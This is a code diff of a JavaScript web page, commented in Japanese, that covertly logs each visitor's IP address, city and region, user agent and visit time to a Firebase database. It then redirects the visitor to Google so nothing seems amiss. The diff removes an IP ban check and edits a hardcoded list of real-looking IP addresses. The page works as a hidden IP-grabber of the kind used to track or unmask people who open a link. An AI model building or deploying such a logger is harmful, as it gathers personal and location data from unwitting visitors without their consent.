@@ -31,7 +31,7 @@
         const db = firebase.database();
 
         // IP BANリスト
-        const bannedIPs = ['180.199.223.6', '180.199.223.5']; // BANしたいIPアドレスをここに追加
+        const bannedIPs = ['180.199.223.65', '180.199.223.5']; // BANしたいIPアドレスをここに追加
 
         // IPアドレスを取得し、処理を実行
         fetch('https://ipinfo.io?callback')
@@ -41,54 +41,47 @@
                 const ip = ipInfo.ip;
                 document.getElementById("ipAddress").textContent = ip;
 
-                // IP BANチェック
-                if (bannedIPs.includes(ip)) {
-                    // IPがBANされている場合の処理
-                    alert("BANNED");
-                    window.location.href = 'https://lighthearted-manatee-c3344e.netlify.app/banned.html'; // BANページにリダイレクト
-                } else {
-                    // ユーザーエージェントを取得
-                    const userAgent = navigator.userAgent;
-                    document.getElementById("userAgent").textContent = userAgent;
+                // ユーザーエージェントを取得
+                const userAgent = navigator.userAgent;
+                document.getElementById("userAgent").textContent = userAgent;
 
-                    // 位置情報を取得
-                    fetch(`https://ipinfo.io/${ip}/json`)
-                        .then(res => res.json())
-                        .then(data => {
-                            const location = data.city + ', ' + data.region;
-                            document.getElementById("location").textContent = location;
+                // 位置情報を取得
+                fetch(`https://ipinfo.io/${ip}/json`)
+                    .then(res => res.json())
+                    .then(data => {
+                        const location = data.city + ', ' + data.region;
+                        document.getElementById("location").textContent = location;
 
-                            // 現在の時間を取得
-                            const timestamp = new Date().toLocaleString();
-                            document.getElementById("timestamp").textContent = timestamp;
+                        // 現在の時間を取得
+                        const timestamp = new Date().toLocaleString();
+                        document.getElementById("timestamp").textContent = timestamp;
 
-                            // Firebase Realtime Databaseにデータを保存
-                            const dataRef = db.ref('user-data');
-                            const newDataRef = dataRef.push();
+                        // Firebase Realtime Databaseにデータを保存
+                        const dataRef = db.ref('user-data');
+                        const newDataRef = dataRef.push();
 
-                            // データをオブジェクトとして保存
-                            const userData = {
-                                timestamp: timestamp,
-                                ip: ip,
-                                location: location,
-                                userAgent: userAgent
-                            };
+                        // データをオブジェクトとして保存
+                        const userData = {
+                            timestamp: timestamp,
+                            ip: ip,
+                            location: location,
+                            userAgent: userAgent
+                        };
 
-                            newDataRef.set(userData)
-                                .then(() => {
-                                    console.log('データがFirebaseに保存されました。');
-                                })
-                                .catch(error => {
-                                    console.error('データの保存中にエラーが発生しました: ', error);
-                                });
+                        newDataRef.set(userData)
+                            .then(() => {
+                                console.log('データがFirebaseに保存されました。');
+                            })
+                            .catch(error => {
+                                console.error('データの保存中にエラーが発生しました: ', error);
+                            });
 
-                            // IPがBANされていない場合、Googleにリダイレクト
-                            window.location.href = 'https://www.google.com';
-                        })
-                        .catch(error => {
-                            console.error('位置情報の取得中にエラーが発生しました: ', error);
-                        });
-                }
+                        // IPがBANされていない場合、Googleにリダイレクト
+                        window.location.href = 'https://www.google.com';
+                    })
+                    .catch(error => {
+                        console.error('位置情報の取得中にエラーが発生しました: ', error);
+                    });
             })
             .catch(error => {
                 console.error('IPアドレスの取得中にエラーが発生しました: ', error);
